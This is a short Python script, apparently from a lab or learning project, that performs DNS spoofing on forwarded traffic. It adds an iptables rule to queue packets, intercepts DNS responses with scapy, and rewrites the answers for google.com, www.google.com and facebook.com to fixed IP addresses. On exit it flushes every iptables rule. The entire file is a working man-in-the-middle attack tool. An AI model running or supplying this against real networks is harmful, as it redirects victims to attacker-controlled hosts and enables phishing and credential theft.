from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"www.google.com.": "192.168.56.110",
    b"google.com.": "192.168.56.110",
    b"facebook.com.": "172.217.19.142"
}

# Function for handle packet
def packet_handler(packet):
	tmp_packet = IP(packet.get_payload())
	if tmp_packet.haslayer(DNSRR):
		# if package valid to DNS Record then try to modificate
		try:
			tmp_packet = modificate(tmp_packet)
		except IndexError:
			pass

		packet.set_payload(bytes(tmp_packet))

	packet.accept()
	pass

def modificate(packet):
	# Get and check packet dns name (example google.com)
	qname = packet[DNSQR].qname
	if qname not in dns_hosts:
		return packet

	# Modificate package put to record name qname and put to record data ip address from out dns_hosts
	packet[DNS].an = DNSRR(rrname = qname, rdata = dns_hosts[qname])
	packet[DNS].ancount = 1

	# Clean packet checksum for generate new checksum
	del packet[IP].len
	del packet[IP].chksum
	del packet[UDP].len
	del packet[UDP].chksum

	return packet

def main():
	QUEUE_NUM = 1
	os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
	queue = NetfilterQueue()

	try:
		queue.bind(QUEUE_NUM, packet_handler)
		queue.run()
	except KeyboardInterrupt:
		os.system("iptables --flush")

	pass

if __name__ == "__main__":
	main()
